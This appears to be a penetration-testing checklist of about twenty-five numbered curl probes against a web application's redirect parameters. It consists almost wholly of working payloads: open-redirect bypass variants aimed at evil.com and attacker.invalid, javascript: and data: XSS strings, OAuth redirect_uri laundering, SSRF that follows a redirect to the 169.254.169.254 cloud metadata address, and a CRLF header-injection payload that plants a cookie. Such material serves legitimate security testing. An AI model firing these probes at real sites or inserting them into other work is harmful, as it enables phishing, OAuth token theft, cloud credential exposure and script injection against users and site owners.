# Probe catalogue — every probe, in the order to run them

## The recon probes

```bash
# P1 — the param vocabulary grep
curl -s "$BASE/" | grep -oiE '(next|url|redir|redirect|return|returnTo|goto|dest|target|continue|out|view|callback|to|forward|link|ref|referer|back|prev|RelayState|post_logout_redirect_uri)[="]'

# P2 — the endpoint inventory
for ep in /login /logout /oauth/authorize /sso /out /goto /link /r /u \
  /redirect /return /back /error /checkout /img /fetch /share /qr; do
  curl -si -o /dev/null -w '%{http_code} %url_effective\n' --max-time 5 "$BASE$ep"
done

# P3 — the tool sweep
python3 tools/web/redirect_probe.py --url "$BASE/login"
python3 tools/web/redirect_probe.py --selftest
```

## The canary probes — the first-touch

```bash
# P4 — the canonical canary
curl -si --max-time 10 "$BASE/login?next=https%3A%2F%2Fattacker.invalid%2Flanding" | grep -i '^location'

# P5 — the relative baseline (confirms the carrier)
curl -si "$BASE/login?next=/dashboard" | grep -i '^location'

# P6 — the bare-word negative (confirms the relative-resolution)
curl -si "$BASE/login?next=evil.com" | grep -i '^location'
#   Location: evil.com -> resolves relative -> NOT the gap
```

## The bypass probes — the filter-shape arms

```bash
# P7 — the scheme-relative
curl -si "$BASE/login?next=%2f%2fevil.com" | grep -i location

# P8 — the backslash family
curl -si "$BASE/login?next=$(enc '/\evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc '\\evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc '/%5cevil.com')" | grep -i location

# P9 — the userinfo family
curl -si "$BASE/login?next=$(enc 'https://target.com@evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'evil.com\@target.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https://evil.com%40target.com')" | grep -i location

# P10 — the substring/suffix family
curl -si "$BASE/login?next=$(enc 'https://target.com.evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'eviltarget.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https://evil.com/target.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https://evil.com?target.com')" | grep -i location

# P11 — the scheme family
curl -si "$BASE/login?next=$(enc 'https:evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https:/\evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https:\\evil.com')" | grep -i location

# P12 — the encoded family
curl -si "$BASE/login?next=$(enc 'https%3a%2f%2fevil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc '%2f%2fevil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https%253a%252f%252fevil.com')" | grep -i location

# P13 — the scheme-XSS family
curl -si "$BASE/login?next=$(enc 'javascript:alert(1)')" | grep -i location
curl -si "$BASE/login?next=$(enc 'data:text/html,<script>alert(1)</script>')" | grep -i location

# P14 — the unicode family
curl -si "$BASE/login?next=$(enc 'https:%ef%bc%8f%ef%bc%8fevil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc 'https://evil%ef%bc%8ecom')" | grep -i location

# P15 — the whitespace/control family
curl -si "$BASE/login?next=$(enc '%20https://evil.com')" | grep -i location
curl -si "$BASE/login?next=$(enc '%09https://evil.com')" | grep -i location
```

## The client-side probes

```bash
# P16 — the meta-refresh
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'meta.*refresh'

# P17 — the JS-nav
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'location\.|window\.location'

# P18 — the DOM-source — the bundle's sink
curl -s "$BASE/app.js" | grep -oE 'location\.(href|replace|assign)\s*=\s*[^;]*'

# P19 — the fragment-carried
curl -s "$BASE/app.js" | grep -oE 'location\.hash[^;]*|URLSearchParams\(location\.hash\)'
```

## The stored/Referer probes

```bash
# P20 — the stored set
curl -s -c c.txt "$BASE/register?return_to=https://attacker.invalid"
# P21 — the stored fire
curl -si -b c.txt "$BASE/login" | grep -i '^location'
# P22 — the Referer-derived
curl -si -H "Referer: https://attacker.invalid" "$BASE/back" | grep -i '^location'
```

## The chain probes

```bash
# P23 — the OAuth launder
curl -si "$OAUTH/authorize?client_id=X&redirect_uri=https%3A%2F%2Fallowlisted.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fattacker.invalid" | grep -i location
# P24 — the SSRF-fetch-follow
curl -s "$BASE/fetch?url=http://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2F"
# P25 — the CRLF-split
curl -si "$BASE/login?next=%2f%0d%0aSet-Cookie:%20x%3Dy" | head -8
```

## The probe-order

```text
P1-P3   the recon — map the vocabulary + the endpoints
P4-P6   the canary + the baseline + the negative
P7-P15  the bypass arms — by the fingerprint
P16-P19 the client-side surfaces
P20-P22 the stored/Referer surfaces
P23-P25 the chain routes
```
